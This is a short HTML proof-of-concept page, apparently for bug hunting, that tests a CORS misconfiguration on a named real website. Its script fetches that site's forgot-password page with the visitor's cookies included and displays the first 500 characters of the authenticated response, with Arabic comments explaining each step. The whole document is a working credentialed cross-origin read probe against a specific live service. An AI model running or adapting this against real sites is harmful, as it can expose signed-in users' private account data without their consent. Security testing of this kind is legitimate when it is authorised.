<!DOCTYPE html>
<html>
<head>
  <title>CORS Test PoC</title>
</head>
<body>
<h2>CORS Misconfiguration Test</h2>
<pre id="output">Waiting...</pre>

<script>
(async () => {
  try {
    const res = await fetch("https://www.myfitnesspal.com/account/forgot-password", {
      method: "GET",
      credentials: "include" // لإرسال الكوكيز
    });

    const text = await res.text();
    document.getElementById("output").textContent = 
      "Status: " + res.status + "\n\n" + text.substring(0, 500); // أول 500 حرف من الرد
  } catch (err) {
    document.getElementById("output").textContent = "Error: " + err;
  }
})();
</script>
</body>
</html>
